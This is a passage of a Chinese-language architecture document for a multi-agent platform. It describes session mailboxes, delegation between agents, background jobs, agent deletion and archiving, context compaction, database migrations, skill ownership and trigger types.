- **工具交回的图片**（如 MCP 浏览器的截图、`read_file` 读的图片文件）：同一套两种形态。`after_tool_execute` 钩子（`ToolImagesToFiles`）在结果写进历史之前，把结果里能内联的图片存进文件存储、换成 `ImageUrl` 引用（有图片的结果总是内容列表）；`AttachmentsForModel` 发请求时把工具结果里的引用换回内容，放在工具结果里交给模型（不加说明、不复制进工作目录）。会话里它们显示在这次调用的过程里（`Item.images`，随过程组折叠；`agent_runtime.conventions.result_images`）；它们是给模型的结果、不是挂给用户的文件，不走 `TOOL_ATTACHMENTS`，也不转交调用方。其他二进制内容（音频、PDF）原样留在结果里。
- **交给工具**：信件交给模型时把附件复制到 agent 工作目录的 `uploads/<id>/<名称>`（重试时覆盖成原件），供文件工具与 shell 处理；这是派生副本，原件只在文件存储里。
- **agent 发出文件**：`share_file(path)` 把工作目录里的文件存一份快照，通过 `ToolReturn.metadata`（`agent_runtime.conventions.TOOL_ATTACHMENTS`）挂到这次工具结果上。metadata 不发给模型、随消息持久化，所以文件一定显示给用户（图片内联、其他为下载链接，显示在过程组外），不依赖模型在回答里转写引用；模型只收到一句「已发给用户」。任何工具都可以用同一约定挂文件。`ask_agent` 的被问 agent 挂上的文件，随调用方那次工具调用的结果一起交给用户（`sessions/answers.py`），出现在用户正在看的会话里。
- **一致性**：内容先写临时文件再改名到最终位置，之后才插入元数据行；失败即上传失败，没有 id 就没有引用。中途被杀留下的临时文件由启动时 `FileStore.recover` 清掉；有内容没元数据的孤儿只占空间，访问不到，同样内容再上传时复用。

### 会话信箱（`sessions/mailbox.py`、`sessions/consumer.py`）

每个会话是一个**信箱**加一个**消费者**。一切要交给 agent 的东西都是往信箱里投一封信件：用户消息（含附件）、对提问的回答、触发器与委派来的任务、后台任务的完成与检查、thread 交回的结果，按到达顺序排列。消费者把信件喂给模型：信箱里有信件就开始一次**运行**（一条 run task，payload 只记交给过它的最大信件 id `through_mail_id`：投递时信箱里最大的，运行开头取走了更新的信件时推进到那里（`hand_over_in`）；输入都在信箱里），把排着的信件交给模型；每次请求模型之前，把这期间新到的信件接在工具结果后面一起交给模型（同 Claude Code：两次工具调用之间就能处理，不等这次运行结束）；模型不再调用工具时这次运行结束，信箱里还有信件就接着跑下一次。异步工作（后台 shell、交回结局的委派）发起后立即返回，结局与运行中检查都只是往发起方的信箱里投信（见上文「占用与结清」）。

- **信件交给模型的样子**：消息是原文加附件引用；事件是用户消息内容里独立的一段（`sessions.conventions.format_event`，`<event source="job:12">…</event>`），那条请求的 metadata 记下是第几段（`RUN_EVENTS`，`sessions.content` 构造内容时就记下，不从文字反推），界面据此把事件单独显示；来源的格式（`thread:<子会话 id>`、`job:<任务号>`）只在 `sessions.sources` 写一次，会话条目与信件接口给出解析好的结构化来源（`EventSource`：thread、job、other），界面不解析字符串；其中运行中检查的下标另记在 `RUN_CHECK_INS`（`RUN_EVENTS` 的子集）；一次请求里的信件都并进同一段用户消息。
- **每一步保存**（`sessions/steps.py`）：一步 = 一次模型请求及其返回的工具调用。请求模型之前，这次请求与它带上的信件（记为已处理，`consumed_by` 是这次运行）在同一个事务里提交；模型回复之后提交这条回复。失败或进程重启后从上一步续跑（见第 5 节）。pydantic-ai 在运行开始时会规整传入的历史（合并相邻的请求、补齐悬空调用的结果，从请求续跑时取出末尾那条准备重发），条数可能和库里不同，所以「已保存到哪」的基准在规整之后取（`StepHooks.started`）。请求模型之前上下文超过压缩阈值时，这次请求照常保存为一步，然后停下驱动、压缩、从库里重新加载上下文续跑（见第 11 节），之后历史只在末尾追加。
- **从哪里开始**（`Consumer._opening`）：历史停在挂起的调用上时不是续跑，哪怕末尾是一条请求——挂起的调用与别的工具在同一个回复里时，pydantic-ai 以挂起结束时把别的工具的结果追加成一条请求，这时回答（或跳过）作为挂起调用的结果交回，pydantic-ai 把已有结果的调用跳过。否则历史停在没得到回复、没标停止的请求上就重发它。

  停在带工具调用的回复上（这一步在执行工具时被打断：进程退出，或这一步失败）时**不重新执行这些调用**：副作用（shell、通知、委派、改记忆）可能已经发生，而我们无从知道——事故 2026-10-21：一条 `run_shell` 重启了服务，恢复的运行把它重放一遍，又重启一次，同一条 run task 恢复到第 66 次。改为给这些调用补上「被中断、没有重新执行」的结果（`history.interrupted_results`，`outcome='interrupted'`，文字告诉模型「可能已经生效，先查再决定要不要重做」），经保存一步的同一条路径写进历史（不留悬空的调用），这次运行从这条补出来的请求重发（`RunState.resending`），模型看着结果自己决定。挂起的调用本身不补（它们在等回信，结果作为挂起调用的结果交回），但和它们在同一个回复里、被打断的其他调用照样补：回答到达时 pydantic-ai 把末尾请求里已有结果的调用标为跳过，那个工具不会被再执行一遍。没出结果的调用**全是**还没交出去的 `ask_agent` 时照旧重新执行（`consumer.interrupted_calls`：按调用 id 幂等，没有别的副作用），只要有一个不能重放就整步都补结果——pydantic-ai 续跑时要么执行这条回复里所有没结果的调用、要么一个都不执行，挑不出单独一个来。
- **续跑接管**：一次运行最终失败后，新到的信件会唤醒新的运行；它从失败处续跑（历史末尾是失败那次保存的步骤），也接管那次运行处理过的信件——推送由它做（委派的失败已经交回过，不再交回）。之后再重试那次失败的运行时，它没有可交给模型的、历史末尾也不是它保存的，什么都不做。
- **唤醒**（`wake_in`，唯一规则）：会话里有排队的信件、没有排队或运行中的运行，并且有信件在最近一次运行之后才到（按信件 id：比那次运行记下的 `through_mail_id` 大，读写只在 mailbox 一处，不比较两张表的时间）；会话停在挂起的调用上时按 `pending.waiting` 判断（见「挂起的调用」）。最后一条保证最终失败的运行不会因为同一批信件被无限重新投递：它被重试、或之后新信件到达时再处理。调用方：投信时（`post_in`）、一次运行结束时（它的收尾事务里，这时队列还没把它记为完成，所以把它排除在「忙」之外，也不做「之后才到」的判断：剩下的信件一定要有下一次运行）、一次运行最终失败时（`RunHandler.failed_in` 结清之后；这时它已记为 failed，照常做「之后才到」的判断）、定期对账（`MailReconciler`，每 30 秒，兜住投信时事务失败、进程重启这类没有及时唤醒的情况）。
- **会话种类**：私有 thread 用户只读（用户消息拒绝，`KindPolicy.user_writable`），其余与普通会话相同。
- **记录**：已处理与被丢弃的信件只作记录（内容已随那一步的消息保存）；排队查询只看 `state = queued` 的行（部分索引）。会话接口给出排队中的信件（界面上显示为待处理）和最近一次停止丢弃的信件（划掉显示）。

## 8. 委派（`sessions/delegation.py`）

做法同 Claude Code 的子 agent：`ask_agent` 与 `delegate_task(report_back: true)` 都是要交回结局的委派。委派完全在会话领域里，由两个对称的事务完成，状态分在两侧、各管一件事：**发起方的占用**（active / released / cleared）记这项委派还要不要交回；**thread 一侧以 holder 为关联 id 的信件**上的 `mail.correlation_settled` 记这个关联有没有结清过，保证只结清一次（第 7 节「关联与结清」）。委派自己的发起参数记在委派子域的 `delegations` 表（`sessions/delegations.py`，按 holder 唯一）：做它的 thread（`thread_session_id`，thread 删除后置空）、report_back 的心跳间隔 `check_seconds`、ask_agent 的超时时刻 `deadline`；占用只剩各种外部工作共用的列（#244 之前这两个参数寄存在 `session_holds` 上，thread 由关联信件推出）。普通 `delegate_task`（不交回）不产生委派：`Threads.send` 只往公开 thread 投一封用户在等的信，并记下调用开出的 thread。委派工具（`delegate_task`、`ask_agent`、`list_threads`、`stop_thread`、`list_agents`）在 `sessions/delegation_tools.py`。

- **发出**（工具里，`Threads.dispatch`，一个事务）：校验并打开或找到 thread（同一 agent 同名续聊，种类不符抛出可纠正的 `InvalidInput`，事务回滚、什么都没写）；在发起方登记占用（holder 由工具调用 id 确定性派生，带 `call_id`、「用户是否在等发起方」），记下委派记录（thread，report_back 的 `check_seconds` 或 ask_agent 的 `deadline`）与调用开出的 thread（`thread_calls`）；往 thread 投一封以 holder 为关联 id 的信件。然后 `ask_agent` 调用 `defer_call()` 挂起，`delegate_task(report_back)` 返回。续跑重新执行这次调用时按 holder 幂等，只返回已经投递到的 thread。
- **交回**（`hand_back_in`，thread 结清关联的同一个事务里，第 7 节「关联与结清」）：按 holder 找到发起方的占用，经 `deliver_in` 交回结局并释放占用。每个关联只结清一次，所以每项委派只交回一次；占用已 cleared（发起方被停止）不投，占用随发起方删除了就没有收件人（记日志）。没有中间状态，没有事件、没有投递顺序要证明。
- **交回的形态**：发起方还停在那次 `ask_agent` 调用上时，结局是一封回答信件，作为调用的结果交回（`AgentAnswer`：回答文字与它挂给用户的文件，经 `sessions.answers` 带上 `TOOL_ATTACHMENTS`；做它的 thread 在 `thread_calls` 里，不在结果上）；否则（`report_back`，或用户已经跳过了那次调用）是一封事件信件（来源 `thread:<子会话 id>`）。thread 的回答不直接推送给用户：交给父 agent 处理，父会话处理它的运行按 `awaited` 推送。
- **发起方被停止**：停止事务清掉它的委派占用，并给做这些工作的 thread 各发一条定向命令 `StopThread`；thread 的停止再停下它自己委派出去的 thread（逐层）。thread 被停止时的结清看到占用已 cleared，不投。
- **超时**（`ThreadChecks`）：ask_agent 的委派（占用还 active）到了 `deadline` 就停掉做它的 thread（同 `stop_thread`，停成了才记下、失败下一拍再停）；thread 结清为「被停止」时，`hand_back_in` 对已过 deadline 的委派把结局写成「在你的 timeout 内没做完、已被停止，它已说的是…」（由 deadline 推出，不另存停止原因），作为调用结果或（发问方已不等时）事件交回。ask_agent 是阻塞的，没有心跳。
- **运行中检查**（`ThreadChecks`）：report_back 的委派按自己的 `check_seconds` 给发起方投检查信件，内容按 thread 的工作状态说（running：在跑多久了、在等重试或还排着；waiting：在等它自己开出的后台任务、委派或提问的回答）。委派没结清时 thread 也可能是 idle（信件到了，投信或运行结束——含最终失败——时的唤醒没做成，例如事务失败、重启，要等定期对账补唤醒下一次运行），这时与还排着同样说「排着、还没开始」。
- **`list_threads`**：每个 thread 的工作状态（同一条规则，批量）、最近一次运行最终失败时的错误、它最近的回答。不按最近一次运行判断做没做完：thread 在等自己开出的工作时最近一次运行已经做完，那时的回答只是中间的。

## 9. 后台任务（`workspace/runner.py`）

做法同 Claude Code 的后台 bash：`run_shell(background: true)` 立即返回任务 id，命令在后台跑，不占住运行、不设时限（前台的 `run_shell` 也不设上限，但它占着运行：`timeout` 由模型按命令自己估）。任务属于发起它的会话，它的消息都作为事件信件（来源 `job:<id>`）投进这个会话的信箱。后台任务属于工作区领域（与文件工具、前台 shell 同一领域，工具集 `workspace.tools.workspace_toolset`），表 `jobs`，执行在 `workspace.runner.JobRunner`。

- **发起**：插入 job 行（running），同一事务把它记为「启动中」（进程内）→ 在会话上登记占用 `job:<id>`（会话领域自己的事务）→ 启动进程 → 登记监督者、记下 pid。启动失败或被取消时在屏蔽作用域里清理（第 4 节），**没有监督者的任务行只有一条收敛规则**（`_close_unsupervised_in`，启动失败、监督意外结束、崩溃后启动共用）：会话还在而上面从没登记过占用，说明任务没开始过，删掉这一行；否则记为被中断，交回会话并释放占用（会话已删除时交回得到 `GONE`，行保留终态）。运行中检查前先对账：记为运行中、却既不在监督之下、也不在启动中的任务按这条规则收敛。
- **结束**：进程退出（或被 `job_kill` 结束）时，在一个事务里记下状态与退出码，同一事务发出定向命令 `WorkEnded`：会话投一封完成事件（退出码、运行时长、命令、最后几行输出、日志路径）并释放占用。用户是否在等完成事件随发起任务的那次运行，登记占用时记在占用上。
- **运行中检查**：到了任务自己的间隔（`jobs.check_seconds`，run_shell 的 heartbeat_seconds）时，在确认任务仍在运行（在监督之下、状态 running）的事务里发出 `WorkCheckIn`（已运行多久、最后几行输出），不推送；agent 据此决定继续等还是 `job_kill`。不限制频率与任务数（按用户决定）。
- **输出**：stdout 与 stderr 合并，逐块脱敏（注入的 secret 替换为 `[secret:KEY]`，`platform.shell.redact` 一遍正则、同一位置最长优先；每块末尾只留下恰好是某个 secret 开头的一段等下一块，切口避开 secret，多行 secret 跨块也不漏）后写进 agent 工作目录的 `jobs/<id>.log`，agent 用 `read_file` 读完整输出，`job_status` 看状态与最后几行。以进程退出为准（不是输出管道关闭）。
- **进程**：自成进程组（`platform.shell.spawn_bash`，与同步 shell 共用环境与 secret 注入），`job_kill` 与关停杀掉整棵进程树。
- **重启**：正常关停时杀掉所有后台任务并记为被中断；启动时（worker 开始之前）把还记为运行中的任务记为被中断并告诉 agent，进程可能还活着（pid 可能已被复用），如实告知怎么核实，不盲杀。
- **停止**：订阅 `SessionStopped`，结束被清掉的占用对应的进程组；结局照常记进自己的行，`WorkEnded` 看到占用已 cleared 不投信。job 行永久保留，会话删除时也不删。

## 10. 删除 agent

1. `AgentLifecycle.delete`：组合根注入的删除阻止查询有一个为真时拒绝（409）——它的会话有忙的（与删除会话同一条规则，会话领域的 `SessionActivity.blocks_agent_deletion_in`）；agent 领域不知道别的领域的 lane；否则把 agent 标为正在删除（`deleting_by`，不出现在列表与名称解析里），同一事务发布 `AgentDeleting`。各领域为 agent 写数据库数据（会话来信与手动压缩、委派、条目与记忆、触发器）之前在同一事务里用 `active_agent_in` 检查，正在删除的按不存在处理：事务串行，检查与写入之间插不进删除，删除流程的清理一定看得到这次写入。条目与记忆（skill、MCP 配置、secret、记忆）同样在写入的事务里检查（`agents.items.writable_in` / `creatable_in` / `changeable_in`、`MemoryStore`），之后由删除流程随 agent 的行一起删掉。读也一样，都在领域的 store 里查、HTTP 层不另查：记忆的读与历史（`MemoryStore`），条目的读（`agents.items.existing_in`）、历史（`check_visible_in`：已删掉的条目照样看得到历史）与条目池的列表；工作历史接口按 `get_active`。例外是运行组装指令时读记忆（`MemoryStore.for_run`）：标记之后仍可能有它的运行开始执行，由删除流程停下，不能因读不到记忆而失败（与会话领域读 agent 的 `agent_in` 同一口径）。
2. 订阅者：
   - 会话：删除它的全部会话（连同私有 thread），发布 `AgentSessionsCleared`（没有会话时立即发布）。标记一提交就不再为它新排工作，但仍可能有会话忙：删除前的检查与标记分属两个事务，之间来的信件排上的运行会在标记之后执行、可能开出后台任务或委派；人为重跑它的任务也会。处理器先停止这些会话（每个只停一次；它们的工作随 agent 一起放弃），再在时限内（30 秒）等它们空闲——正在执行的运行被取消后，停止事务在它退出之后才执行，正在执行的压缩做完才空闲——然后删除。时限内没有空闲就按暂时失败重试，重试时同样先停止再等；重试用完时投递记为 failed，可见，人工重试。
   - 触发器：删除它的触发器。
3. agent 领域订阅 `AgentSessionsCleared`：删除工作目录与它的 skill 的生成目录，再删除这一行；它名下的条目（skill、MCP server、secret）、记忆与分发规则（`agent_rules`）随行级联删除（同一领域内的外键），同一事务里为每一项记一版「deleted with agent」（分享出去的条目先转给平台）。记忆或分发规则的行缺失是数据不一致：记版本时报错（`CorruptState` / `NotFound`），删除投递失败可见、agent 停在正在删除，由人修数据后重试，不跳过。工作目录删不干净（例如它留在后台的进程还在往里写）只记 warning、照常删除：残留文件只占空间，不能让 agent 卡在正在删除；启动检查把已删除 agent 留下的工作目录列进日志，由人清理。

**归档（#219）**是可以来回切换的停用，数据都留着：`AgentLifecycle.set_archived`（工具 `update_agent(archived=)`，HTTP `PUT/DELETE /api/agents/{id}/archive`）把 `archived_at` 设上或清掉。归档要求它空闲（与删除同一组阻止查询）且不是系统默认 agent（归档的也不能设为默认）。「可用」因此分两级：`active_agent_in`（没在删除）管配置与资源的写入，归档的照常可改；`runnable_agent_in`（另外没归档，否则 `AgentArchived`，是 Conflict）管给它派新工作的入口：来信与新会话（`sessions.inbound`，一处挡住 Web 消息、委派、触发器与 issue 的投信）、issue 的指派与 owner、触发器的创建与触发（`_fire` 开头就查：不跑前置检查；激活机制只记日志，触发器保持启用）。已有 issue 的动态投给归档 agent 时只记时间线、不投递；已校验、还没投进会话的来信在 `on_receive` 丢弃（同删除）。归档不是单向事实（为什么仍可在别的领域事务里检查见 2.2），但只在空闲时发生：检查与标记之间插进的运行照常做完，包括它在这期间开出的后台任务与委派的结局（经 `post_in` 直接投回会话，不走来信检查），已知并接受。有意不挡的：手动压缩（数据维护，不是新工作）、「任务」页人工重试失败的任务（人工旁路）。触发器：定时的跳过这一次；一次性的到期时已用掉那一次，推送告诉用户任务没做（附 prompt）；流式的监听进程照跑，归档期间的事件丢弃（脚本的游标已前移，取消归档后不补）。issue 指派给归档 agent 的 in_progress 会被标为停滞（stalled），用来提醒转派。`list_agents` 按分组（`group`，只用于展示）列出、不列归档的；`GET /api/agents` 全部返回，界面自己分组、把归档的折叠在最后。

## 11. 上下文压缩

与模型提供方无关的统一机制（`sessions/compaction.py`）。pydantic-ai 只为 Anthropic 与 OpenAI Responses 提供原生压缩，`openai` 兼容接口和 Gemini 没有，按提供方分支会产生两套语义，所以统一自己实现：

- **触发**：发给模型的上下文（上一次模型请求的输入 token，pydantic-ai 已计入缓存 token）超过 `runtime.compaction_threshold_tokens` 时，由消费者在步与步之间压缩：运行开始时，以及每次请求模型之前（这次请求照常保存为一步，然后停下驱动、压缩、从库里重新加载上下文续跑，pydantic-ai 重发末尾那条请求）。「该不该压缩」只有一条规则（`Compactor.verdict`）：只认最近一次压缩之后的回复报告的 token 数（之前的反映的是压缩前的上下文，按压缩记录的 `at_message_id` 推导）；压缩后的第一次回复就超阈值，说明保留窗口本身就超了，这次运行不再压缩，上下文继续变大直到超出模型的上限时运行失败可见，重试时重新判断。模型不返回 usage（部分 OpenAI 兼容服务流式时如此）时记 warn 日志，自动压缩对该模型失效。也可在会话页手动触发：同一个会话 lane 上的一个 `compaction` task，处理器只调用同一个压缩方法。
- **执行**：把最近 `runtime.compaction_keep_steps` 步之前的消息连同上一份摘要交给该 agent 的模型总结，写入 `compactions` 表（`through_message_id` + `summary`）。切点在步与步之间、之前的消息里没有悬空调用的地方（`compaction.steps_of`）：工具调用与其结果、挂起的调用与之后的回答不会被拆开；一次运行中途也有切点（每一批工具结果之后），长任务在运行中也能压缩。单次只取总长不超过上限的最早若干步，不截断内容，剩下的接着压缩，直到保留窗口之外没有可压缩的。
- **使用**：发给模型的上下文 = 最新摘要（放进 instructions）+ 切点之后的原始消息（`sessions.history.load_context`；切点之后的第一条是回复时，前面补一条说明「接着之前的工作」的请求）。原始消息不删除，UI 显示完整原文并标出压缩点。

## 12. 数据库迁移

Alembic 管理表结构（`src/muliao/migrations/`，随包分发），启动时自动升级到最新版本。整个升级在一个真正的事务里：pysqlite 默认只在 DML 前隐式开事务、DDL 逐条自动提交，所以迁移使用独立连接，驱动设为 autocommit 并显式 `BEGIN IMMEDIATE`，任何失败都完整回滚。SQLite 改表用 batch 模式（建新表-拷数据-删旧表），迁移连接在建立时关闭外键以免删旧表时级联删除子表数据，提交前执行 `foreign_key_check`，有违例则回滚。`tests/test_migrations.py` 保证迁移后的结构与模型定义一致。

2026-10-20 按领域重构时用户决定不做数据迁移：迁移历史重置为唯一的初始版本，上线时重建生产库。此后每次结构变化新增一个迁移，已部署的数据只通过迁移升级，不删库。

## 13. 进化机制

### Skill
agent 在任何一次运行里都可以主动 `write_skill`。新建的 skill 归它自己、只有它用；要给别的 agent 用就加进角色（如 base 人人可用）。名字全局唯一。

**归属与分发（skill、MCP server、secret 共用，两条规则只在 `agents/access.py` 写一次）**：每个条目有 owner（某个 agent，或 None 即平台：迁移前的公共条目、用户在界面上建的、内置工具）。**规则 1（能用，`Grants.uses`）**：agent 能用的 = 它自己 owner 的 ∪ 它的规则（base + 角色 + 自己的 allow / deny，见第 6 节）放行的；deny 只作用于规则分来的，不作用于自己的条目。用到时按当时的角色定义算：skill 索引（instructions）、MCP 连接（每次运行）、secret 解析（`run_shell`、后台任务、前置检查、流式触发、MCP 配置）都走 `access.usable_in`。**规则 2（能改，`check_change_in`）**：用户、owner、带 `admin` 角色的 agent；否则 `Forbidden`，并说明 owner 是谁。改已有条目时 owner 不变；新建的 owner 由调用方给出（agent 建的归自己，界面上可指定）；为 agent 新建、改它名下的条目都在同一写事务里查它还可用（正在删除的按不存在处理）。**收录只有一个定义**：一组规则收录一个条目 = `Rules.allows`（allow 匹配、deny 没拦）；条目页列出的「收录于」角色与删 agent 时的判断都用它。删除 agent 时，它名下被 base 收录（人人可用，也给以后新建的 agent）或被某个别的 agent 的规则（base + 角色 + 自己的 allow / deny）收录的条目转给平台（记一版），其余随它删除（`access.Sharing.shared`，`ownership.retire_owned_in`）。**转移 owner**（#238，`ItemCatalog.transfer_item`，与删 agent 共用 `ownership.transfer_in`；界面条目卡片上的「转移 owner」= `PUT /api/items/{kind}/{name}/owner`，admin 工具 `transfer_item`）：按规则 2 查转移的人，新 owner 要还可用（归档的也行），内置工具不能转、转给原 owner 是错误；内容与收录它的角色不变，记一版。没有同名遮蔽：同名就是同一个条目。记忆不是条目，全局记忆与 agent 自己的记忆各占一段（见下）。「分发」不是安全隔离：agent 能执行任意命令、读到数据库与 vault 主密钥（见第 15 节）。界面（#231）：管理菜单「资源」组。**条目页**（`/items?kind=&owner=`）按种类（工具、skill、MCP、secret）列出全部条目、不分公共私有，每项显示 owner 与收录它的角色；**页面只读一个来源** `GET /api/items`（`ItemCatalog.catalog`），按 kind 区分的联合类型，每种带自己的详情（内置工具的读写与管理类、MCP 的配置与启停），没被收录的标明「只有 owner 能用」或「没有 agent 能用」；新建时选 owner；skill 编辑在 `/items/skill`；版本历史在卡片上展开时才请求（secret 只看不能恢复）。**条目接口统一**为 `/api/items/{kind}/{name}`：skill、MCP、secret 各自的 GET / PUT / DELETE（GET 读单个条目：skill 带正文供编辑页用，MCP、secret 的单个读取是给脚本与 agent 用的 REST，条目页不用；PUT 新建或改写；MCP 的 PUT 只新建，同名 409），通用的 `/owner`、`/history`、`/restore`（kind 只接受 skill、mcp、secret），种类专有的子路径：MCP 的 `/enabled`、`/tools`（测试连接），skill 的 `/package`（导出）与 `POST /api/items/skill`（导入）。原来的 `/api/tools`、`/api/resources`、`/api/skill`、`/api/mcp`、`/api/vault` 已删。**角色页**编辑收录 / 禁止规则（输入框从条目池补全 `kind:name` 与 `kind:*`），每个角色显示它能用的工具与条目、分给了哪些 agent（`RoleOut.reach`、`agents`），编辑时用 `POST /api/role-preview` 实时预览。**agent 配置**勾选角色、写自己的 allow / deny，`POST /api/agent-preview` 给出最终能用的工具与条目（含它自己的；与保存同样校验）。MCP 启停只在条目页。

### Memory（全局记忆与 agent 记忆）
全局记忆与 agent 的记忆都在 `memories` 表，同一套规则（`MemoryStore`，按 `agent_id` 区分，None 即全局；不叫 owner，owner 只指条目归属与 issue 负责项目）：有长度上限（`memory_max_chars`），每次运行全文放进 instructions（全局在最前，agent 自己的在运行上下文之后），修改在同一事务里记一版并记下改的人（actor：`user` 或做出修改的 agent），恢复即把旧版内容作为新的一版写入。全局记忆从未写过时为空（没有行）；agent 的记忆在创建时写入（空），缺失即数据不一致。读写接口 `GET/PUT /api/memory?agent=`（agent 缺省为全局），历史与恢复 `GET /api/memory/history?agent=`、`POST /api/memory/restore`；界面在「全局记忆」页和 agent 的记忆标签里；接口只列最近 50 版，更早的仍在表里。

### 自我进化
平台不在运行之间插入强制反思（#116 删掉了每 N 步的 reflection）。agent 改记忆（自己的与全局的）、自己 own 的 skill 都在自己的会话里用自我改进工具完成，每次修改都有版本（`revisions`），用户可回滚。定期的整理由 trigger 驱动、按 base 角色里的 skill 执行（每日 self-evolve：各 agent 修缺陷、沉淀重复模式，对照自己的版本时间线自己对正确性负责 → 全部做完后 curator 只管跨 agent 的重复上提与冲突），不是平台机制。每日 self-evolve 的第一步是把前一天做过的事写进工作历史（第 22 节）。

## 14. 触发源与通知

触发点有两类：用户在网页发起对话，以及触发器。agent 之间的委派是 agent 内部能力，在父会话下开 thread（第 7 节）。

**统一入口**：用户消息、触发器、agent 委派都是同一件事——把一段内容投进某个 agent 的某个会话的信箱。各来源只做适配（鉴权、触发时机、组装内容），三种入口各有自己的类型，字段只有这个入口用得上的，不合用的组合构造不出来（不到运行时才拒绝）：界面的 `UserMessage`（续写的会话 id 或 `NewChat(agent)`——标题由消息推导，可带附件与回答，用户在等；`SessionService.receive`），别的领域的 `SenderMail`（只有文字、没人在等，origin 只能是有身份的发送方，目标是会话 id、`NewConversation`（预先分配的 id、agent、标题）或 `SessionKey`；`receive_command_in` 校验后经定向命令 `Receive` 投递，见下文「投信」），委派由会话领域的 `Threads` 在内部构造。三者都转成内部的 `Inbound` 交给 `inbound.receive`：

| 字段 | 含义 |
|---|---|
| `origin` / `origin_ref` | 来源与具体发送方：用户（无）、触发器 id、issue id、委派方（父）会话 id；与会话上的同名字段是同一个概念（会话记的是发起它的那一个事件的来源） |
| `content` | 交给 agent 的内容 |
| `session` | 已有会话的 id（在其中继续）；`NewSession`（新建：agent、标题，委派时还有父会话、thread 名与种类；触发器经 `Receive` 投递时带预先分配的会话 id，好立即告诉调用方）；或 `SessionKey`（按发送方定位：这个发送方给这个 agent 开过的最新一个顶层会话，没有就以给定标题新建——发送方不用存会话 id，issue 用它让每个（issue, agent）对应唯一一个会话） |
| `awaited` | 用户是否在等它的回答（处理它的运行结束时推送；UserMessage 为真，SenderMail 为假，委派由 Threads 定） |
| `attachments` / `answers` | 用户随消息发送的文件、对挂起提问的回答（只有用户会带） |

`receive` 是外部来信投进信箱的唯一入口（委派的 `Threads.send` / `dispatch` 也经过它；代码里的生产者——占用的结局 `deliver_in`、运行中检查 `post_check_in`——直接 `mailbox.post_in`），校验规则与别的领域投信用的 `receive_command_in` 是同一个函数；新建会话也只有 `create_session` 一处实现。**续写规则**：用户可以在任何用户能写的会话里继续（`KindPolicy.user_writable`）；其他来源只能续写自己发起的会话（会话的来源与发送方都一致，委派会话的发送方就是它的父会话），否则 403。发送方身份是触发器 id（AUTOINCREMENT，删除后不复用）或父会话 id。

是否推送由信件的 `awaited` 决定（唯一来源），由投信的入口设置：

| 入口 | session 策略 | `awaited` |
|---|---|---|
| 用户发起 / 回复 | 新建；回复沿用（私有 thread 只读） | 是（iOS 要求每个 push 都展示通知，所以页面可见时也会弹） |
| 触发器 | 默认每次新建，`origin_ref` 记触发器；带回会话 id 的事件在原会话里续写（只能续写本触发器发起的会话） | 否，需要通知时 agent 调 `notify_user` |
| `delegate_task` | 父会话下的公开 thread，同名续聊 | 是；`report_back` 时否（结果交回父会话） |
| `ask_agent` | 父会话下的私有 thread，同名续聊 | 否（回答作为工具结果交给发问方） |

**触发器**：具名、持久的事件来源（`triggers` 表）。公共字段只有名称、agent、处理说明、启用、已结束（见下）与最近一次触发的记录；怎么被触发由 `kind` 决定，**只在代码里多态实现**，表里不为某种方式开专门的列：`config`（JSON）是这种方式的配置，`state`（JSON）是这种方式自己维护的运行状态。每种方式分两部分：

- `TriggerKind`（纯逻辑，注册给 `TriggerService`）：校验并规范化 `config`、由配置推导 `state`、给出展示用的运行状态（每种方式一个 pydantic 类型，不含凭证）。推导在创建、修改配置（规范化后与原配置相同的不算，如界面只改说明时带着的原配置）与停用后重新启用时进行，由 `TriggerService` 合并进已有 `state`（实现不负责保留与配置无关的部分，如 token 摘要）；
- 激活机制：怎么被触发，都只调用 `TriggerService.fire`（唯一出口，先跑前置检查，见下）组装成事件交给统一入口；需要感知触发器变化的激活机制各自 `watch()` 一个通知，互不干扰；某种方式专有的接口放在它自己的 API 模块（如 `api/webhook.py`）。

新增一种方式（例如消息队列）= 一个 `TriggerKind` + 它的激活机制（消费循环），在组合根注册并启动；表、工具、统一入口都不用改；HTTP 接口的 `TriggerOut` 是按 `kind` 区分的联合类型（每种方式的 config 与 status 各有类型，`TriggerKindName` 列出全部方式，测试校验它与注册的方式一致），所以要在 `api/triggers.py` 加一个成员，界面（`pages/Triggers.tsx` 按 kind 的穷举 switch）也要补上这种方式的编辑器与状态展示，漏了编译器会报。现有四种：

| kind | config | state | 激活机制 |
|---|---|---|---|
| `schedule` | `{"cron": "<5 段表达式>"}`，按配置的时区解释 | `next_run_at`；连续跳过时还有 `skipped`（次数、起始时间、挡路会话的工作状态，以及内部用的挡路会话 id 与本轮是否已通知） | `DueRunner` + `ScheduleDue`：消耗这次到期 = 推进到下次时间；上一次触发的会话不空闲时跳过本次（会话领域的工作状态 `SessionActivity.work_state_in` 不是 idle：在运行、有还没投递的 `Receive`，或在等后台任务、委派、用户回答）。跳过要看得见：连续跳过记在 `state.skipped`，状态里给出 `skipped`（界面显示「已跳过 N 次」）；挡路的会话在等待（可能永远等不到，如没人回答的提问）时 `Notify` 用户，每轮连续跳过只通知一次，在运行的不通知（运行偶尔长过一个周期是常态）；下次真正触发、改配置或重新启用时清除，挡路的会话换了（手动立即运行）算新的一轮；停机期间错过的只补一次，暂停期间错过的不补（重新启用时从当时算起） |
| `once` | `{"at": "<ISO 8601 时间>"}`，不带时区的按配置的时区解释，创建时必须在将来 | `{}`（到期时间就是配置本身） | `DueRunner` + `OnceDue`：消耗这次到期 = 结束（`finished_at`）。到点只触发一次，之后从列表里消失 |
| `webhook` | `{}` | `token_hash` | `Webhooks`：`POST /api/hooks/{name}[?session_id=]` 凭 token 鉴权 |
| `stream` | `{"command": "<bash>", "secrets": [...], "debounce_seconds": 5}` | `generation`（每次推导换一个，托管进程由它与配置决定）；`running_since`、`error`、`failures`（进程的运行状态，由 `StreamRunner` 维护；推导时与每个托管进程开始时清零） | `StreamRunner`：见下「流式触发」 |

**按到期时间触发**（`triggers/due.py`，`schedule` 与 `once` 共用）：`DueRunner` 一个循环扫描所有还会到期的触发器，到期的并发触发。每种方式只给出两件事（`DueKind`）：到期时间从哪来（`due_at`），以及**消耗这次到期**时这一行怎么变（`consume_in`：定时推进到下次，一次性的结束）。消耗与触发不在一个事务里（触发可能先跑前置检查，不能占着事务）：先提交消耗，再调用 `fire`，所以进程恰好死在两者之间时这一次被跳过，**至多触发一次**；触发前按最新的行重新判断（列出之后被删除、停用、结束或改了配置就跳过）；触发被拒绝时停用并记 `disabled_reason`（经 `TriggerService.disable`，和别的修改一样通知监听者）；存下的配置或状态坏了、算不出到期时间的（`due_at` / `consume_in` 抛 `CorruptState`）同样只停用这一个，扫描循环照常继续。

